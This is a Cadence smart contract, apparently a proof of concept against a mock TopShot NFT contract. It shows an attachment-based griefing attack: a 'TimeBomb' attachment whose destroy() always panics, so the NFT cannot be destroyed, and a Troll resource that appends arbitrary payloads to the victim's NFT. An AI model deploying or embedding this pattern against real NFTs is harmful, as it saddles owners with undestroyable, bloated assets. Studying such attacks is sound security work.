import MockTopShot from "./MockTopShot.cdc"

pub contract TrollAttacker {

    pub let TrollStoragePath: StoragePath

    pub event DataBombAdded(to: UInt64)

    pub struct DataBomb {
        pub let id: UInt64
        pub let payload: String
        init(id: UInt64, payload: String) {
            self.id = id
            self.payload = payload
        }
    }

    pub attachment TimeBomb for MockTopShot.NFT {
        pub let id: UInt64
        pub let dataBombs: [DataBomb]
        pub var counter: UInt64

        init() {
            self.id = base.id
            self.dataBombs = []
            self.counter = 0
        }

        pub fun getDataBombs(): [DataBomb] {
            return self.dataBombs
        }

        access(contract) fun addDataBomb(payload: String) {
            self.dataBombs.append(
                DataBomb(
                    id: self.counter,
                    payload: payload
            ))
            self.counter = self.counter + 1
            emit DataBombAdded(to: self.id)
        }

        destroy() {
            panic("Can't destroy, you've been trolled!!!")
        }
    }

    pub resource Troll {
        pub fun addData(toNFT: &MockTopShot.NFT, payload: String) {
            if let delayedAttackRef = toNFT[TimeBomb] {
                delayedAttackRef.addDataBomb(payload: payload)
            }
        }
    }

    pub fun addTimeBomb(toNFT: @MockTopShot.NFT): @MockTopShot.NFT {
        if toNFT[TimeBomb] == nil {
            return <- attach TimeBomb() to <- toNFT
        }
        return <-toNFT
    }

    init() {
        self.TrollStoragePath = /storage/Troll
        self.account.save(<-create Troll(), to: self.TrollStoragePath)
    }
}
